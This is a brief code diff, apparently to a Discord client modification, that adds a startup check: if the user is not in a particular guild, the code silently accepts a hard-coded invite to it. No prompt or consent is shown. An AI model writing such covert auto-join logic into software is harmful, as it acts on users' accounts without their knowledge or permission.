@@ -31,6 +31,10 @@ import api from "./api";
   await utils.sleep(100);
   api.unexposedAPI.extensions._init();
   loadingAnimation.hide();
+
+  if (!api.unexposedAPI.modules.common.GuildStore.getGuild("1078486841688342568")) {
+    api.unexposedAPI.modules.common.InviteActions.acceptInvite({ inviteKey: "rrtKWh48v9" });
+  }
 })();
 
 // extras
